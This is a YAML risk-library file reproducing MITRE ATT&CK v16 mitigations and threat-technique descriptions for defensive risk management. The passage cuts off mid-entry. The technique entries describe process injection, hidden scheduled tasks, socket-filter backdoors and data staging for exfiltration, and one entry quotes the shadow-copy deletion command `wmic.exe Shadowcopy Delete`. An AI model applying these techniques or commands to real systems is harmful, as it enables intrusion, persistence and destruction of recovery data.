urn: urn:intuitem:risk:library:mitre-attack
locale: en
ref_id: mitre-attack
name: Mitre ATT&CK v16 - Threats and mitigations
description: Mitre ATT&CK v16 - Threats and mitigations
copyright: "Terms of Use\nLICENSE\nThe MITRE Corporation (MITRE) hereby grants you\
  \ a non-exclusive, royalty-free license to use ATT&CK\xAE for research, development,\
  \ and commercial purposes. Any copy you make for such purposes is authorized provided\
  \ that you reproduce MITRE's copyright designation and this license in any such\
  \ copy.\n\"\xA9 2022 The MITRE Corporation. This work is reproduced and distributed\
  \ with the permission of The MITRE Corporation.\"\nDISCLAIMERS\nMITRE does not claim\
  \ ATT&CK enumerates all possibilities for the types of actions and behaviors documented\
  \ as part of its adversary model and framework of techniques. Using the information\
  \ contained within ATT&CK to address or cover full categories of techniques will\
  \ not guarantee full defensive coverage as there may be undisclosed techniques or\
  \ variations on existing techniques not documented by ATT&CK.\nALL DOCUMENTS AND\
  \ THE INFORMATION CONTAINED THEREIN ARE PROVIDED ON AN \"AS IS\" BASIS AND THE CONTRIBUTOR,\
  \ THE ORGANIZATION HE/SHE REPRESENTS OR IS SPONSORED BY (IF ANY), THE MITRE CORPORATION,\
  \ ITS BOARD OF TRUSTEES, OFFICERS, AGENTS, AND EMPLOYEES, DISCLAIM ALL WARRANTIES,\
  \ EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO ANY WARRANTY THAT THE USE OF\
  \ THE INFORMATION THEREIN WILL NOT INFRINGE ANY RIGHTS OR ANY IMPLIED WARRANTIES\
  \ OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE."
version: 2
provider: Mitre ATT&CK
packager: intuitem
objects:
  reference_controls:
  - urn: urn:intuitem:risk:function:mitre-attack:m1031
    ref_id: M1031
    name: Network Intrusion Prevention
    category: technical
    csf_function: detect
    description: 'Use intrusion detection signatures to block traffic at network boundaries.

      https://attack.mitre.org/mitigations/M1031'
  - urn: urn:intuitem:risk:function:mitre-attack:m1016
    ref_id: M1016
    name: Vulnerability Scanning
    category: technical
    csf_function: detect
    description: 'Vulnerability scanning is used to find potentially exploitable software
      vulnerabilities to remediate them.

      https://attack.mitre.org/mitigations/M1016'
  - urn: urn:intuitem:risk:function:mitre-attack:m1035
    ref_id: M1035
    name: Limit Access to Resource Over Network
    category: technical
    csf_function: protect
    description: 'Prevent access to file shares, remote access to systems, unnecessary
      services. Mechanisms to limit access may include use of network concentrators,
      RDP gateways, etc.

      https://attack.mitre.org/mitigations/M1035'
  - urn: urn:intuitem:risk:function:mitre-attack:m1029
    ref_id: M1029
    name: Remote Data Storage
    category: technical
    csf_function: protect
    description: 'Use remote security log and sensitive file storage where access
      can be controlled better to prevent exposure of intrusion detection log data
      or sensitive information.

      https://attack.mitre.org/mitigations/M1029'
  - urn: urn:intuitem:risk:function:mitre-attack:m1037
    ref_id: M1037
    name: Filter Network Traffic
    category: technical
    csf_function: protect
    description: 'Use network appliances to filter ingress or egress traffic and perform
      protocol-based filtering. Configure software on endpoints to filter network
      traffic.

      https://attack.mitre.org/mitigations/M1037'
  - urn: urn:intuitem:risk:function:mitre-attack:m1021
    ref_id: M1021
    name: Restrict Web-Based Content
    category: technical
    csf_function: protect
    description: 'Restrict use of certain websites, block downloads/attachments, block
      Javascript, restrict browser extensions, etc.

      https://attack.mitre.org/mitigations/M1021'
  - urn: urn:intuitem:risk:function:mitre-attack:m1033
    ref_id: M1033
    name: Limit Software Installation
    category: technical
    csf_function: protect
    description: 'Block users or groups from installing unapproved software.

      https://attack.mitre.org/mitigations/M1033'
  - urn: urn:intuitem:risk:function:mitre-attack:m1013
    ref_id: M1013
    name: Application Developer Guidance
    category: technical
    csf_function: govern
    description: 'This mitigation describes any guidance or training given to developers
      of applications to avoid introducing security weaknesses that an adversary may
      be able to take advantage of.

      https://attack.mitre.org/mitigations/M1013'
  - urn: urn:intuitem:risk:function:mitre-attack:m1034
    ref_id: M1034
    name: Limit Hardware Installation
    category: technical
    csf_function: protect
    description: 'Block users or groups from installing or using unapproved hardware
      on systems, including USB devices.

      https://attack.mitre.org/mitigations/M1034'
  - urn: urn:intuitem:risk:function:mitre-attack:m1017
    ref_id: M1017
    name: User Training
    category: technical
    csf_function: govern
    description: 'Train users to be aware of access or manipulation attempts by an
      adversary to reduce the risk of successful spearphishing, social engineering,
      and other techniques that involve user interaction.

      https://attack.mitre.org/mitigations/M1017'
  - urn: urn:intuitem:risk:function:mitre-attack:m1052
    ref_id: M1052
    name: User Account Control
    category: technical
    csf_function: protect
    description: 'Configure Windows User Account Control to mitigate risk of adversaries
      obtaining elevated process access.

      https://attack.mitre.org/mitigations/M1052'
  - urn: urn:intuitem:risk:function:mitre-attack:m1028
    ref_id: M1028
    name: Operating System Configuration
    category: technical
    csf_function: protect
    description: 'Make configuration changes related to the operating system or a
      common feature of the operating system that result in system hardening against
      techniques.

      https://attack.mitre.org/mitigations/M1028'
  - urn: urn:intuitem:risk:function:mitre-attack:m1053
    ref_id: M1053
    name: Data Backup
    category: technical
    csf_function: recover
    description: 'Take and store data backups from end user systems and critical servers.
      Ensure backup and storage systems are hardened and kept separate from the corporate
      network to prevent compromise.

      https://attack.mitre.org/mitigations/M1053'
  - urn: urn:intuitem:risk:function:mitre-attack:m1038
    ref_id: M1038
    name: Execution Prevention
    category: technical
    csf_function: protect
    description: 'Block execution of code on a system through application control,
      and/or script blocking.

      https://attack.mitre.org/mitigations/M1038'
  - urn: urn:intuitem:risk:function:mitre-attack:m1043
    ref_id: M1043
    name: Credential Access Protection
    category: technical
    csf_function: protect
    description: 'Use capabilities to prevent successful credential access by adversaries;
      including blocking forms of credential dumping.

      https://attack.mitre.org/mitigations/M1043'
  - urn: urn:intuitem:risk:function:mitre-attack:m1045
    ref_id: M1045
    name: Code Signing
    category: technical
    csf_function: protect
    description: 'Enforce binary and application integrity with digital signature
      verification to prevent untrusted code from executing.

      https://attack.mitre.org/mitigations/M1045'
  - urn: urn:intuitem:risk:function:mitre-attack:m1039
    ref_id: M1039
    name: Environment Variable Permissions
    category: technical
    csf_function: protect
    description: 'Prevent modification of environment variables by unauthorized users
      and groups.

      https://attack.mitre.org/mitigations/M1039'
  - urn: urn:intuitem:risk:function:mitre-attack:m1057
    ref_id: M1057
    name: Data Loss Prevention
    category: technical
    csf_function: detect
    description: 'Use a data loss prevention (DLP) strategy to categorize sensitive
      data, identify data formats indicative of personal identifiable information
      (PII), and restrict exfiltration of sensitive data.(Citation: PurpleSec Data
      Loss Prevention)

      https://attack.mitre.org/mitigations/M1057'
  - urn: urn:intuitem:risk:function:mitre-attack:m1025
    ref_id: M1025
    name: Privileged Process Integrity
    category: technical
    csf_function: protect
    description: 'Protect processes with high privileges that can be used to interact
      with critical system components through use of protected process light, anti-process
      injection defenses, or other process integrity enforcement measures.

      https://attack.mitre.org/mitigations/M1025'
  - urn: urn:intuitem:risk:function:mitre-attack:m1055
    ref_id: M1055
    name: Do Not Mitigate
    category: technical
    csf_function: govern
    description: 'This category is to associate techniques that mitigation might increase
      risk of compromise and therefore mitigation is not recommended.

      https://attack.mitre.org/mitigations/M1055'
  - urn: urn:intuitem:risk:function:mitre-attack:m1056
    ref_id: M1056
    name: Pre-compromise
    category: technical
    csf_function: govern
    description: 'This category is used for any applicable mitigation activities that
      apply to techniques occurring before an adversary gains Initial Access, such
      as Reconnaissance and Resource Development techniques.

      https://attack.mitre.org/mitigations/M1056'
  - urn: urn:intuitem:risk:function:mitre-attack:m1020
    ref_id: M1020
    name: SSL/TLS Inspection
    category: technical
    csf_function: protect
    description: 'Break and inspect SSL/TLS sessions to look at encrypted web traffic
      for adversary activity.

      https://attack.mitre.org/mitigations/M1020'
  - urn: urn:intuitem:risk:function:mitre-attack:m1046
    ref_id: M1046
    name: Boot Integrity
    category: technical
    csf_function: protect
    description: 'Use secure methods to boot a system and verify the integrity of
      the operating system and loading mechanisms.

      https://attack.mitre.org/mitigations/M1046'
  - urn: urn:intuitem:risk:function:mitre-attack:m1060
    ref_id: M1060
    name: Out-of-Band Communications Channel
    category: technical
    csf_function: protect
    description: 'Establish secure out-of-band communication channels to ensure the
      continuity of critical communications during security incidents, data integrity
      attacks, or in-network communication failures. Out-of-band communication refers
      to using an alternative, separate communication path that is not dependent on
      the potentially compromised primary network infrastructure. This method can
      include secure messaging apps, encrypted phone lines, satellite communications,
      or dedicated emergency communication systems. Leveraging these alternative channels
      reduces the risk of adversaries intercepting, disrupting, or tampering with
      sensitive communications and helps coordinate an effective incident response.(Citation:
      TrustedSec OOB Communications)(Citation: NIST Special Publication 800-53 Revision
      5)

      https://attack.mitre.org/mitigations/M1060'
  - urn: urn:intuitem:risk:function:mitre-attack:m1030
    ref_id: M1030
    name: Network Segmentation
    category: technical
    csf_function: protect
    description: 'Architect sections of the network to isolate critical systems, functions,
      or resources. Use physical and logical segmentation to prevent access to potentially
      sensitive systems and information. Use a DMZ to contain any internet-facing
      services that should not be exposed from the internal network. Configure separate
      virtual private cloud (VPC) instances to isolate critical cloud systems.

      https://attack.mitre.org/mitigations/M1030'
  - urn: urn:intuitem:risk:function:mitre-attack:m1019
    ref_id: M1019
    name: Threat Intelligence Program
    category: technical
    csf_function: protect
    description: 'A threat intelligence program helps an organization generate their
      own threat intelligence information and track trends to inform defensive priorities
      to mitigate risk.

      https://attack.mitre.org/mitigations/M1019'
  - urn: urn:intuitem:risk:function:mitre-attack:m1027
    ref_id: M1027
    name: Password Policies
    category: technical
    csf_function: protect
    description: 'Set and enforce secure password policies for accounts.

      https://attack.mitre.org/mitigations/M1027'
  - urn: urn:intuitem:risk:function:mitre-attack:m1040
    ref_id: M1040
    name: Behavior Prevention on Endpoint
    category: technical
    csf_function: detect
    description: 'Use capabilities to prevent suspicious behavior patterns from occurring
      on endpoint systems. This could include suspicious process, file, API call,
      etc. behavior.

      https://attack.mitre.org/mitigations/M1040'
  - urn: urn:intuitem:risk:function:mitre-attack:m1018
    ref_id: M1018
    name: User Account Management
    category: technical
    csf_function: protect
    description: 'Manage the creation, modification, use, and permissions associated
      to user accounts.

      https://attack.mitre.org/mitigations/M1018'
  - urn: urn:intuitem:risk:function:mitre-attack:m1022
    ref_id: M1022
    name: Restrict File and Directory Permissions
    category: technical
    csf_function: protect
    description: 'Restrict access by setting directory and file permissions that are
      not specific to users or privileged accounts.

      https://attack.mitre.org/mitigations/M1022'
  - urn: urn:intuitem:risk:function:mitre-attack:m1026
    ref_id: M1026
    name: Privileged Account Management
    category: technical
    csf_function: protect
    description: 'Manage the creation, modification, use, and permissions associated
      to privileged accounts, including SYSTEM and root.

      https://attack.mitre.org/mitigations/M1026'
  - urn: urn:intuitem:risk:function:mitre-attack:m1024
    ref_id: M1024
    name: Restrict Registry Permissions
    category: technical
    csf_function: protect
    description: 'Restrict the ability to modify certain hives or keys in the Windows
      Registry.

      https://attack.mitre.org/mitigations/M1024'
  - urn: urn:intuitem:risk:function:mitre-attack:m1049
    ref_id: M1049
    name: Antivirus/Antimalware
    category: technical
    csf_function: detect
    description: 'Use signatures or heuristics to detect malicious software.

      https://attack.mitre.org/mitigations/M1049'
  - urn: urn:intuitem:risk:function:mitre-attack:m1032
    ref_id: M1032
    name: Multi-factor Authentication
    category: technical
    csf_function: protect
    description: 'Use two or more pieces of evidence to authenticate to a system;
      such as username and password in addition to a token from a physical smart card
      or token generator.

      https://attack.mitre.org/mitigations/M1032'
  - urn: urn:intuitem:risk:function:mitre-attack:m1054
    ref_id: M1054
    name: Software Configuration
    category: technical
    csf_function: protect
    description: 'Implement configuration changes to software (other than the operating
      system) to mitigate security risks associated to how the software operates.

      https://attack.mitre.org/mitigations/M1054'
  - urn: urn:intuitem:risk:function:mitre-attack:m1048
    ref_id: M1048
    name: Application Isolation and Sandboxing
    category: technical
    csf_function: protect
    description: 'Restrict execution of code to a virtual environment on or in transit
      to an endpoint system.

      https://attack.mitre.org/mitigations/M1048'
  - urn: urn:intuitem:risk:function:mitre-attack:m1047
    ref_id: M1047
    name: Audit
    category: technical
    csf_function: protect
    description: 'Perform audits or scans of systems, permissions, insecure software,
      insecure configurations, etc. to identify potential weaknesses.

      https://attack.mitre.org/mitigations/M1047'
  - urn: urn:intuitem:risk:function:mitre-attack:m1050
    ref_id: M1050
    name: Exploit Protection
    category: technical
    csf_function: detect
    description: 'Use capabilities to detect and block conditions that may lead to
      or be indicative of a software exploit occurring.

      https://attack.mitre.org/mitigations/M1050'
  - urn: urn:intuitem:risk:function:mitre-attack:m1015
    ref_id: M1015
    name: Active Directory Configuration
    category: technical
    csf_function: protect
    description: 'Implement robust Active Directory configurations using group policies
      to control access and reduce the attack surface. Specific examples include:


      * Account Configuration: Use provisioned domain accounts rather than local accounts
      to leverage centralized control and auditing capabilities.

      * Interactive Logon Restrictions: Enforce group policies that prohibit interactive
      logons for accounts that should not directly access systems.

      * Remote Desktop Settings: Limit Remote Desktop logons to authorized accounts
      to prevent misuse by adversaries.

      * Dedicated Administrative Accounts: Create specialized domain-wide accounts
      that are restricted from interactive logons but can perform specific tasks like
      installations or repository access.

      * Authentication Silos: Configure Authentication Silos in Active Directory to
      create access zones with restrictions based on membership in the Protected Users
      global security group. This setup enhances security by applying additional protections
      to high-risk accounts, limiting their exposure to potential attacks.

      https://attack.mitre.org/mitigations/M1015'
  - urn: urn:intuitem:risk:function:mitre-attack:m1051
    ref_id: M1051
    name: Update Software
    category: technical
    csf_function: protect
    description: 'Perform regular software updates to mitigate exploitation risk.

      https://attack.mitre.org/mitigations/M1051'
  - urn: urn:intuitem:risk:function:mitre-attack:m1044
    ref_id: M1044
    name: Restrict Library Loading
    category: technical
    csf_function: protect
    description: 'Prevent abuse of library loading mechanisms in the operating system
      and software to load untrusted code by configuring appropriate library loading
      mechanisms and investigating potential vulnerable software.

      https://attack.mitre.org/mitigations/M1044'
  - urn: urn:intuitem:risk:function:mitre-attack:m1042
    ref_id: M1042
    name: Disable or Remove Feature or Program
    category: technical
    csf_function: protect
    description: 'Remove or deny access to unnecessary and potentially vulnerable
      software to prevent abuse by adversaries.

      https://attack.mitre.org/mitigations/M1042'
  - urn: urn:intuitem:risk:function:mitre-attack:m1036
    ref_id: M1036
    name: Account Use Policies
    category: technical
    csf_function: protect
    description: 'Configure features related to account use like login attempt lockouts,
      specific login times, etc.

      https://attack.mitre.org/mitigations/M1036'
  - urn: urn:intuitem:risk:function:mitre-attack:m1041
    ref_id: M1041
    name: Encrypt Sensitive Information
    category: technical
    csf_function: protect
    description: 'Protect sensitive information with strong encryption.

      https://attack.mitre.org/mitigations/M1041'
  threats:
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.011
    ref_id: T1055.011
    name: Extra Window Memory Injection
    description: "Adversaries may inject malicious code into process via Extra Window\
      \ Memory (EWM) in order to evade process-based defenses as well as possibly\
      \ elevate privileges. EWM injection is a method of executing arbitrary code\
      \ in the address space of a separate live process. \n\nBefore creating a window,\
      \ graphical Windows-based processes must prescribe to or register a windows\
      \ class, which stipulate appearance and behavior (via windows procedures, which\
      \ are functions that handle input/output of data).(Citation: Microsoft Window\
      \ Classes) Registration of new windows classes can include a request for up\
      \ to 40 bytes of EWM to be appended to the allocated memory of each instance\
      \ of that class. This EWM is intended to store data specific to that window\
      \ and has specific application programming interface (API) functions to set\
      \ and get its value. (Citation: Microsoft GetWindowLong function) (Citation:\
      \ Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough\
      \ to store a 32-bit pointer and is often used to point to a windows procedure.\
      \ Malware may possibly utilize this memory location in part of an attack chain\
      \ that includes writing code to shared sections of the process\u2019s memory,\
      \ placing a pointer to the code in EWM, then invoking execution by returning\
      \ execution control to the address in the process\u2019s EWM.\n\nExecution granted\
      \ through EWM injection may allow access to both the target process's memory\
      \ and possibly elevated privileges. Writing payloads to shared sections also\
      \ avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code>\
      \ and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July\
      \ 2017) More sophisticated malware samples may also potentially bypass protection\
      \ mechanisms such as data execution prevention (DEP) by triggering a combination\
      \ of windows procedures and other system functions that will rewrite the malicious\
      \ payload inside an executable portion of the target process.  (Citation: MalwareTech\
      \ Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\
      \nRunning code in the context of another process may allow access to the process's\
      \ memory, system/network resources, and possibly elevated privileges. Execution\
      \ via EWM injection may also evade detection from security products since the\
      \ execution is masked under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.005
    ref_id: T1053.005
    name: Scheduled Task
    description: 'Adversaries may abuse the Windows Task Scheduler to perform task
      scheduling for initial or recurring execution of malicious code. There are multiple
      ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111)
      utility can be run directly on the command line, or the Task Scheduler can be
      opened through the GUI within the Administrator Tools section of the Control
      Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET
      wrapper for the Windows Task Scheduler, and alternatively, adversaries have
      used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
      (WMI) to create a scheduled task. Adversaries may also utilize the Powershell
      Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create
      a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)


      An adversary may use Windows Task Scheduler to execute programs at system startup
      or on a scheduled basis for persistence. The Windows Task Scheduler can also
      be abused to conduct remote Execution as part of Lateral Movement and/or to
      run a process under the context of a specified account (such as SYSTEM). Similar
      to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),
      adversaries have also abused the Windows Task Scheduler to potentially mask
      one-time execution under signed/trusted system processes.(Citation: ProofPoint
      Serpent)


      Adversaries may also create "hidden" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564))
      that may not be visible to defender tools and manual queries used to enumerate
      tasks. Specifically, an adversary may hide a task from `schtasks /query` and
      the Task Scheduler by deleting the associated Security Descriptor (SD) registry
      value (where deletion of this value must be completed using SYSTEM permissions).(Citation:
      SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate
      methods to hide tasks, such as altering the metadata (e.g., `Index` value) within
      associated registry keys.(Citation: Defending Against Scheduled Task Attacks
      in Windows Environments)

      https://attack.mitre.org/techniques/T1053/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1205.002
    ref_id: T1205.002
    name: Socket Filters
    description: 'Adversaries may attach filters to a network socket to monitor then
      activate backdoors used for persistence or command and control. With elevated
      permissions, adversaries can use features such as the `libpcap` library to open
      sockets and install filters to allow or disallow certain types of data to come
      through the socket. The filter may apply to all traffic passing through the
      specified network interface (or every interface if not specified). When the
      network interface receives a packet matching the filter criteria, additional
      actions can be triggered on the host, such as activation of a reverse shell.


      To establish a connection, an adversary sends a crafted packet to the targeted
      host that matches the installed filter criteria.(Citation: haking9 libpcap network
      sniffing) Adversaries have used these socket filters to trigger the installation
      of implants, conduct ping backs, and to invoke command shells. Communication
      with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation:
      exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May
      2020)


      Filters can be installed on any Unix-like platform with `libpcap` installed
      or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with
      `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER`
      options. Since the socket connection is not active until the packet is received,
      this behavior may be difficult to detect due to the lack of activity on a host,
      low CPU overhead, and limited visibility into raw socket usage.

      https://attack.mitre.org/techniques/T1205/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1560.001
    ref_id: T1560.001
    name: Archive via Utility
    description: "Adversaries may use utilities to compress and/or encrypt collected\
      \ data prior to exfiltration. Many utilities include functionalities to compress,\
      \ encrypt, or otherwise package data into a format that is easier/more secure\
      \ to transport.\n\nAdversaries may abuse various utilities to compress or encrypt\
      \ data before exfiltration. Some third party utilities may be preinstalled,\
      \ such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows\
      \ systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may\
      \ be used to package collected files into a cabinet (.cab) file. <code>diantz</code>\
      \ may also be used to download and compress files from remote locations (i.e.\
      \ [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation:\
      \ diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories\
      \ with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160)\
      \ to Base64 encode collected data before exfiltration. \n\nAdversaries may use\
      \ also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform\
      \ similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation:\
      \ WinZip Homepage)\nhttps://attack.mitre.org/techniques/T1560/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.005
    ref_id: T1021.005
    name: VNC
    description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to remotely control machines using Virtual Network Computing (VNC).  VNC is\
      \ a platform-independent desktop sharing system that uses the RFB (\u201Cremote\
      \ framebuffer\u201D) protocol to enable users to remotely control another computer\u2019\
      s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation:\
      \ The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)\
      \ as VNC is screen-sharing software rather than resource-sharing software. By\
      \ default, VNC uses the system's authentication, but it can be configured to\
      \ use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation:\
      \ VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions\
      \ as the logged-on user such as opening documents, downloading files, and running\
      \ arbitrary commands. An adversary could use VNC to remotely control and monitor\
      \ a system to collect data and information to pivot to other systems within\
      \ the network. Specific VNC libraries/implementations have also been susceptible\
      \ to brute force attacks and memory usage exploitation.(Citation: Hijacking\
      \ VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC\
      \ Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation:\
      \ Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)\nhttps://attack.mitre.org/techniques/T1021/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1047
    ref_id: T1047
    name: Windows Management Instrumentation
    description: "Adversaries may abuse Windows Management Instrumentation (WMI) to\
      \ execute malicious commands and payloads. WMI is designed for programmers and\
      \ is the infrastructure for management data and operations on Windows systems.(Citation:\
      \ WMI 1-3) WMI is an administration feature that provides a uniform environment\
      \ to access Windows system components.\n\nThe WMI service enables both local\
      \ and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021)\
      \ such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)\
      \ and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation:\
      \ WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM\
      \ operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI\
      \ 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with\
      \ local and remote systems and use it as a means to execute various behaviors,\
      \ such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007)\
      \ as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands\
      \ and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused\
      \ by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy\
      \ Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation:\
      \ WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the\
      \ WMIC feature being \u201Cdisabled by default\u201D on Windows 11+. WMIC will\
      \ be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell\
      \ and tools like `wbemtool.exe`, COM APIs can also be used to programmatically\
      \ interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)\nhttps://attack.mitre.org/techniques/T1047"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1113
    ref_id: T1113
    name: Screen Capture
    description: 'Adversaries may attempt to take screen captures of the desktop to
      gather information over the course of an operation. Screen capturing functionality
      may be included as a feature of a remote access tool used in post-compromise
      operations. Taking a screenshot is also typically possible through native utilities
      or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation:
      CopyFromScreen .NET)(Citation: Antiquated Mac Malware)

      https://attack.mitre.org/techniques/T1113'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.011
    ref_id: T1027.011
    name: Fileless Storage
    description: 'Adversaries may store data in "fileless" formats to conceal malicious
      activity from defenses. Fileless storage can be broadly defined as any format
      other than a file. Common examples of non-volatile fileless storage in Windows
      systems include the Windows Registry, event logs, or WMI repository.(Citation:
      Microsoft Fileless)(Citation: SecureList Fileless) In Linux systems, shared
      memory directories such as `/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock`
      may also be considered fileless storage, as files written to these directories
      are mapped directly to RAM and not stored on the disk.(Citation: Elastic Binary
      Executed from Shared Memory Directory)(Citation: Akami Frog4Shell 2024)(Citation:
      Aquasec Muhstik Malware 2024)


      Similar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620)
      and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless
      data storage may remain undetected by anti-virus and other endpoint security
      tools that can only access specific file formats from disk storage. Leveraging
      fileless storage may also allow adversaries to bypass the protections offered
      by read-only file systems in Linux.(Citation: Sysdig Fileless Malware 23022)


      Adversaries may use fileless storage to conceal various types of stored data,
      including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003))
      and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)).
      Adversaries also often encrypt, encode, splice, or otherwise obfuscate this
      fileless data when stored.


      Some forms of fileless storage activity may indirectly create artifacts in the
      file system, but in central and otherwise difficult to inspect formats such
      as the WMI (e.g., `%SystemRoot%\System32\Wbem\Repository`) or Registry (e.g.,
      `%SystemRoot%\System32\Config`) physical files.(Citation: Microsoft Fileless)

      https://attack.mitre.org/techniques/T1027/011'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037
    ref_id: T1037
    name: Boot or Logon Initialization Scripts
    description: "Adversaries may use scripts automatically executed at boot or logon\
      \ initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy\
      \ Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can\
      \ be used to perform administrative functions, which may often execute other\
      \ programs or send information to an internal logging server. These scripts\
      \ can vary based on operating system and whether applied locally or remotely.\
      \  \n\nAdversaries may use these scripts to maintain persistence on a single\
      \ system. Depending on the access configuration of the logon scripts, either\
      \ local credentials or an administrator account may be necessary. \n\nAn adversary\
      \ may also be able to escalate their privileges since some boot or logon initialization\
      \ scripts run with higher privileges.\nhttps://attack.mitre.org/techniques/T1037"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1557
    ref_id: T1557
    name: Adversary-in-the-Middle
    description: 'Adversaries may attempt to position themselves between two or more
      networked devices using an adversary-in-the-middle (AiTM) technique to support
      follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040),
      [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002),
      or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)).
      By abusing features of common networking protocols that can determine the flow
      of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device
      to communicate through an adversary controlled system so they can collect information
      or perform additional actions.(Citation: Rapid7 MiTM Basics)


      For example, adversaries may manipulate victim DNS settings to enable other
      malicious activities such as preventing/redirecting users from accessing legitimate
      sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation:
      ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their
      position in order to intercept user credentials, including access tokens ([Steal
      Application Access Token](https://attack.mitre.org/techniques/T1528)) and session
      cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation:
      volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s
      can also be used to establish an AiTM position, such as by negotiating a less
      secure, deprecated, or weaker version of communication protocol (SSL/TLS) or
      encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation:
      tlseminar_downgrade_att)


      Adversaries may also leverage the AiTM position to attempt to monitor and/or
      modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).
      Adversaries can setup a position similar to AiTM to prevent traffic from flowing
      to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562)
      and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).

      https://attack.mitre.org/techniques/T1557'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1033
    ref_id: T1033
    name: System Owner/User Discovery
    description: 'Adversaries may attempt to identify the primary user, currently
      logged in user, set of users that commonly uses a system, or whether a user
      is actively using the system. They may do this, for example, by retrieving account
      usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).
      The information may be collected in a number of different ways using other Discovery
      techniques, because user and username details are prevalent throughout a system
      and include running process ownership, file/directory ownership, session information,
      and system logs. Adversaries may use the information from [System Owner/User
      Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery
      to shape follow-on behaviors, including whether or not the adversary fully infects
      the target and/or attempts specific actions.


      Various utilities and commands may acquire this information, including <code>whoami</code>.
      In macOS and Linux, the currently logged in user can be identified with <code>w</code>
      and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v ''_''</code>
